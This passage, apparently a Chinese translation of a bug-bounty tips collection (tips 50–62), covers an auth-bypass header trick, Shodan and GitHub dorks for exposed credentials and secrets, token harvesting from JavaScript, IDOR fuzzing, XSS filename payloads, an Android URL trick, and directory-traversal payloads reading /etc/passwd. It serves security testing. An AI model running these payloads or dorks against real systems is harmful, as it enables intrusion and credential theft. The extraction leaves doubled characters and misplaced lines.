HTTP/1.1 200 OK
现在让我们试试这个。
Request:
GET /ResetPassword.json HTTP/1.1{"email":"PI:EMAIL"}
Response:
HTTP/1.1 200 OK{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-
edc8a"}
请注意在我们的请求中添加了了.json扩展名，从⽽而获得了了秘密令牌!
50. 使⽤用httpx实现HTTP⾃自动化
By @pdnuclei
Source: link
你知道吗，你可以使⽤用https⼯工具来请求任何URL路路径，并且可以随时查看状态码和⻓长度以及其他细节，
进⾏行行过滤，甚⾄至对它们进⾏行行精确匹配。
这⾥里里有⼀一个例例⼦子。
cat domains.txt | httpx -path /swagger-api/ -status-code -content-length
验室制作翻译出品
⾮非常有⽤用，从这⾥里里获取最新版本。
https://github.com/projectdiscovery/httpx/releases
51. 使⽤用 Shodan dorks信息收集
By @manas_hunter
Source: link
下⾯面就为⼤大家盘点7个厉害的SHODAN dorks，让⼤大家轻松信息收集。
1. “default password” org:orgName
2. “230 login successful” port:21 org:orgName
3. vsftpd 2.3.4 port:21 org:orgName
4. 230 ‘anonymous@’ login ok org:orgName
5. guest login ok org:orgName
6. country:EU port 21 -530 +230 org:orgName
7. country:IN port:80 title:protected org:orgName
通过这些Shodan dorks，我们正在寻找与FTP相关的访问凭证和凭证，也许是在⽹网上或其他地⽅方暴暴露露的
⽇日志⽂文件中，也可能是⽬目标组织相关的管理理控制台等受保护区域。
52. 如何发现认证绕过漏漏洞洞
By @jae_hak99
Source: link
验室制作翻译出品
这是⼀一个有趣的提示，可以帮助你找到认证绕过漏漏洞洞。
Request:
GET /delete?user=test HTTP/1.1
Response:
HTTP/1.1 401 Unauthorized
现在让我们试试这个。
Request:
GET /delete?user=test HTTP/1.1X-Custom-IP-Authorization: 127.0.0.1
Response:
HTTP/1.1 302 Found
当前端使⽤用添加的⾃自定义HTTP头(X-Custom-IP-Authorization)时，这可能会起作⽤用--例例如，当它被⽤用来
识别通过负载均衡器器连接到Web服务器器的客户端的原始IP地址时。
通过识别⾃自⼰己是127.0.0.1，我们可能会规避Web应⽤用程序的访问控制，并执⾏行行特权操作。
53. 简单的ffuf bash单⾏行行命令
By @naglinagli
Source: link
这⾥里里有⼀一个由@naglinagli制作的有⽤用的bash函数单⾏行行本，可以解决你所有的⽬目录搜索需求。只需将其添
加到你的 ~/.bashrc:
同时确保你有最新的https://github.com/danielmiessler/SecLists，并在上⾯面的函数中使⽤用正确的路路
径。
现在你可以像这样轻松地对你的⽬目标域进⾏行行递归⽬目录搜索（dirbusting）。
在'SecLists/Discovery/Web-Content/'⽬目录下的任何⼀一个wordlist中使⽤用这个。下⾯面是⼀一个使
⽤用'tomcat.txt'wordlist的例例⼦子。
ffufr() {
  ffuf -c -w "/path/to/SecLists/Discovery/Web-Content/$1" -u "$2/FUZZ" -
recursion
}
ffufr WORDLISTNAME.txt DOMAIN.com
验室制作翻译出品
以下是本技巧所需的全部内容。
https://github.com/ffuf/ffuf
https://github.com/danielmiessler/SecLists
54. 使⽤用ffuf 和 gau发现access tokens
By @Haoneses
Source: link
这⾥里里还有⼀一个有⽤用的bug赏⾦金金提示，涉及到ffuf，也涉及到gau。这可以帮助你找到各种服务API的访问令
牌。
1. 收集你的⽬目标的所有链接:
cat hosts | sed 's/https\?:\/\///' | gau > urls.txt
2. 过滤掉javascript URL:
cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt
3. 使⽤用ffuf只获取有效的链接，并将其直接发送到Burp中。:
验室制作翻译出品
ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
4. 使⽤用Scan Check Builder Burp扩展，添加被动配置⽂文件提取 "accessToken "或 "access_token"。
5. 在Burp中对这些javascript链接运⾏行行被动扫描。
6. 提取发现的令牌，并在报告前对其进⾏行行验证。
附加。如何验证发现的访问令牌？使⽤用KeyHacks来识别特定的API密钥，如何使⽤用它们以及如何检查它
们是否有效。
提示。确保也尝试提取其他⽂文件类型，如.php、.json等。(第⼆二步)。
以下是本技巧所需的全部内容。
https://github.com/lc/gau
https://github.com/ffuf/ffuf
https://github.com/streaak/keyhacks
55. 使⽤用GitHub dorks发现secrets
By @impratikdabhi
Source: link
这⾥里里列列出了了10个GitHub dorks寻找secrets和access_token。
1. “target.com” send_keys
2. “target.com” password
3. “target.com” api_key
4. “target.com” apikey
5. “target.com” jira_password
6. “target.com” root_password
7. “target.com” access_token
8. “target.com” config
9. “target.com” client_secret
10. “target.com” user auth
有了了这些GitHub dorks，我们就可以识别各种secrets。和前⾯面的提示⼀一样，使⽤用KeyHacks来识别和验
证发现的secrets。
56. 使⽤用⾕谷歌缓存查找敏敏感数据
By @pry0cc
Source: link
以下是@pry0cc如何通过⾕谷歌缓存找到他的⼀一个⽬目标的证书。
⾕谷歌对⽬目标⽹网站进⾏行行了了dorked。
发现打开的HTTP⽬目录。
导航到那⾥里里--它被打了了补丁。
查看Google缓存，错误⽇日志路路径被暴暴露露。
复制相同的路路径到⽹网站的/，下载了了300 MB的⽹网⻚页错误⽇日志。
解析错误⽇日志，发现明⽂文的凭证。
瞬间就起⻜飞!
验室制作翻译出品
这就是为什什么总是进⾏行行彻底的OSINT分析是⾄至关重要的。在这种情况下，@pry0cc将永远⽆无法列列举它，
也⽆无法通过强制⼿手段找到它。它就在那⾥里里，⼀一瞬间，就被google索引了了。
57. 找出更更多IDOR漏漏洞洞的窍⻔门
By @m4ll0k2
Source: link
这⾥里里有⼀一个整洁的技巧，可以让你找到更更多的IDOR漏漏洞洞。
假设你发现了了以下端点。
现在对它进⾏行行⼀一些模糊处理理（/api/getUser$FUZZ$）。你有可能会发现其他的端点，⽐比如这些。
这些新（旧）端点有可能是不不同的，并且有可能受到IDOR的影响。
如果你想知道什什么是IDOR漏漏洞洞 - 它代表 "不不安全的直接对象引⽤用"，它允许你访问、编辑或删除属于其他
⽤用户的信息。
这通常是通过任意改变（猜测或递增）值来实现的，如。
id
uid
Pid
Name
如果Web应⽤用程序没有正确验证访问权限，你可能会访问其他⽤用户的数据。IDORs是关键的漏漏洞洞，所以
绝对值得特别注意。
提示。使⽤用以下词表来识别不不同的终端版本（与ffuf或Burp Intruder⼀一起使⽤用）。
https://github.com/InfosecMatter/Wordlists/blob/master/version-fuzz.txt
58. 有效的电⼦子邮件地址与恶意的有效payloads
By @Haoneses
Source: link
在测试带有电⼦子邮件地址字段的⽹网络应⽤用时，⼀一个不不太为⼈人所知的攻击向量量是使⽤用电⼦子邮件地址的注释
部分。这是RFC822规范中定义的电⼦子邮件地址的⼀一个功能。
这意味着我们可以提供⼀一个任意的注释作为电⼦子邮件地址的⼀一部分，它仍然是⼀一个完全有效的电⼦子邮件
地址。下⾯面是它的样⼦子。
“payload”@domain.com
name@”payload”domain.com
/api/getUser
/api/getUserV1
/api/getUserV2
/api/getUserBeta
验室制作翻译出品
name(payload)@domain.com
name@(payload)domain.com
PI:EMAIL(payload)
这些都是有效的电⼦子邮件地址（你可以在电⼦子邮件地址验证器器中检查它们，例例如这⾥里里）。[...] 
提示。查阅这个bug赏⾦金金提示，了了解⼀一些良好的有效payloads实例例。
59. ⽤用gf搜索有趣的参数
By @HackersOnDemand
Source: link
你是否有⼤大量量从其他⼯工具输出的URL列列表？
使⽤用gf⼯工具(由@tomnomnom制作)来搜索有趣的参数，有可能受到开放重定向、SSRF等的影响。
现在我们可以关注这些URL，并详细测试它们的开放重定向漏漏洞洞。
请注意，对于这个提示，你将需要额外的gf模式（由@1ndianl33t制作），你可以从这⾥里里获得。
https://github.com/1ndianl33t/Gf-Patterns
确保将所有这些.json⽂文件复制到你的~/.gf/⽬目录下，这样gf就能找到它们。
提示。同时，你还可以使⽤用gf-secrets模式（由@dwiswant0制作），它可以识别各种API密钥、秘密和
访问令牌。
https://github.com/dwisiswant0/gf-secrets
60.以图像⽂文件名作为XSS有效payloads
By @h4x0r_dz
Source: link
如果你发现⼀一个图⽚片的⽂文件上传功能，可以尝试在⽂文件名中引⼊入⼀一个带有XSS（跨站脚本）有效
payloads的图⽚片，⽐比如这样。
cat url-list.txt | gf redirects
.png
">.png
">.svg
alert('xss')a.png
验室制作翻译出品
请注意，这可能只在基于UNIX的系统上⼯工作，因为Windows不不接受特殊字符作为⽂文件名。然⽽而，作为⼀一
种反射的XSS，它应该普遍适⽤用。
61. 在Android应⽤用中打开任意URL
By @mem3hack
Source: link
寻找⼀一种简单的⽅方法来打开Android应⽤用中的任意URL？
1. 下载jadx反编译器器并安装adb。
2. 打开AndroidManifest.xml
3. 查找所有浏览器器活动（必须包含  ）。
为每个活动（或您的任何域）运⾏行行" adb shell am start -n 
app_package_name/component_name -a android.intent.action.view -d google.com "。
同时在Burp中跟踪任何对google.com或你的域名的请求。
4. 如果⼀一个域名被打开，这意味着你发现了了⼀一个漏漏洞洞! 现在检查请求是否包含任何auth令牌(如果是，
说明你的账户被接管了了！)。没有？尝试不不同的技术来获取任何PII。在最坏的情况下，如果你能在
⼀一个应⽤用程序中打开任意链接，你会得到像XSS⼀一样的奖励。
请注意，我们可以使⽤用apktool来代替jadx反编译器器，它有更更好的能⼒力力从APK中解码
AndroidManifest.xml⽂文件。
如果你使⽤用的是Kali Linux，最简单的⽅方法就是使⽤用apt.apktool来获取所有必要的程序。
62. ⽬目录遍历有效payloads
By @manas_hunter
Source: link
这⾥里里有⼀一个有趣的列列表，列列出了了7个不不常⻅见的⽬目录遍历有效载荷，可以轻松地赢得⼀一些赏⾦金金。
1. \..\WINDOWS\win.ini
2. ..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
3. .?\.?\.?\etc\passwd
4. ../../boot.ini
5. %0a/bin/cat%20/etc/passwd
6. \\'/bin/cat%20/etc/passwd\\'
7. ..%c1%afetc%c1%afpasswd
这个列列表包含了了基于Windows和UNIX操作系统的有效载荷。在有效payloads 2、5和6中，我们甚⾄至可
以找到RCE（远程代码/命令执⾏行行）漏漏洞洞。